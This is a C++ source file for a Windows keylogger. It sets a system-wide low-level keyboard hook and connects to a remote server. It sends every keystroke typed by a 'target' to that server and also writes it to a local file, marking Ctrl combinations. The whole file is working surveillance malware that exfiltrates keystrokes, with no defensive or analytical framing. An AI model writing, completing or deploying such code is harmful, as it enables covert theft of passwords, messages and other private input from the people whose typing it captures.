#include "keylogger.h"


keylogger::keylogger()
    : client(&validation_function)
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);
    if (!client.Connect(server_ip, server_port))
    {
        std::cout << "COULDNT CONNECT!\n";
    }
    kq::message<messageType> msg(messageType::targetConnected);
    client.Send(msg);
    std::cout << "Connected!\n";

}
keylogger::~keylogger()
{
    if (hook != NULL)
        UnhookWindowsHookEx(hook);

    kq::message<messageType> msg(messageType::targetDisconnected);
    client.Send(msg);
    client.Disconnect();
}

LRESULT CALLBACK keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);


        int virtualKeyCode = kbdStruct->vkCode;
        int scanCode = kbdStruct->scanCode;

        bool ctrlPressed = ((GetAsyncKeyState(VK_CONTROL) & 0x8000));


        BYTE keyboardState[256] = { 0 };
        GetKeyboardState(keyboardState);

        WORD asciiCode;
        if (ToAscii(virtualKeyCode, scanCode, keyboardState, &asciiCode, 0) == 1) {

            std::ofstream file("taste.txt", std::ios::app);


            kq::message<messageType> msg(messageType::targetTyped);
            msg << char(asciiCode);
            GetInstance().client.Send(msg);
            std::cout << "I tried sending " << char(asciiCode) << '\n';


            if (file.is_open()) {

                if (ctrlPressed) {
                    file << "Ctrl+ " << static_cast<char>(asciiCode);

                }
                else
                {
                    file << static_cast<char>(asciiCode);
                }



                file.close();
            }
            else {
                std::cerr << "Eroare la deschiderea fisierului!" << std::endl;
            }
        }
    }


    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
 keylogger& keylogger::GetInstance()
{
    static keylogger instance;
    return instance;
}

HHOOK keylogger::keylogger::hook;